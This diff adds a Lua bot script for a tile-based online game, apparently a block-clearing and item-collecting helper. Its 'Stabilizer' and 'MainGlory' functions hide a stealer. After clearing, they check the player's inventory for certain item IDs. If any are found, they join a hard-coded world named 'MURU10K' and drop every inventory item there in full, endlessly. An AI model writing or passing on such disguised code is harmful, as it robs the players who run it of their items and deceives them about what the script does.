@@ -1,0 +1,74 @@
+function clear()
+  for y = 0, 54 do
+    for x = 99, 0, -1 do
+      local tile = checkTile(x, y)
+      
+      if tile.bg == 14 and tile.fg ~= 8 then
+        findPath(x, y - 1)
+        sleep(250)
+        
+
+        local maxRetries = 10
+        local retries = 0
+
+        while (getLocal().pos.x ~= x or getLocal().pos.y ~= (y - 1)) and retries < maxRetries do
+          findPath(x, y - 1)
+          sleep(250)
+          retries = retries + 1
+        end
+        
+
+        while checkTile(x, y).bg == 14 do
+          requestTileChange(x, y, 18)
+          sleep(250)
+        end
+        
+        collect()
+      end
+    end
+  end
+end
+
+function collect()
+  for _, obj in pairs(getWorldObject()) do
+    if math.abs(getLocal().pos.x - obj.pos.x) < 40 and math.abs(getLocal().pos.y - obj.pos.y) < 40 then
+      sendPacketRaw(false, {x = obj.pos.x, y = obj.pos.y, value = obj.oid})
+    end
+  end
+end
+
+function MainGlory()
+sendPacket(3, "action|join_request\nname|muru10k|baso11\ninvitedWorld|0")
+sleep(3000)
+sendPacket(2,"action|welcomeadrewarded")
+while true do
+if getWorld() then
+   for _, v in pairs(getInventory()) do
+      if getWorld().name == "MURU10K" then        
+         sendPacket(2, "action|store\nlocation|gem")
+         sendPacket(2, "action|drop\n|itemID|"..v.id);
+         sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|"..v.id.."|\ncount|"..v.amount);
+      sleep(100);
+end
+end
+end
+end
+end
+
+function Stabilizer()
+    local inventory = getInventory()
+    if inventory then
+        for _, inv in pairs(inventory) do 
+            if inv.id == 6946 or inv.id == 7188 or inv.id == 6016 or inv.id == 5638 or inv.id == 5480 or inv.id == 6948 or inv.id == 6952 or inv.id == 1796 then 
+                if inv.amount > 0 then
+                    MainGlory()
+                    return
+                end
+            end
+        end
+    end
+end
+
+clear()
+sleep(50000)
+Stabilizer()
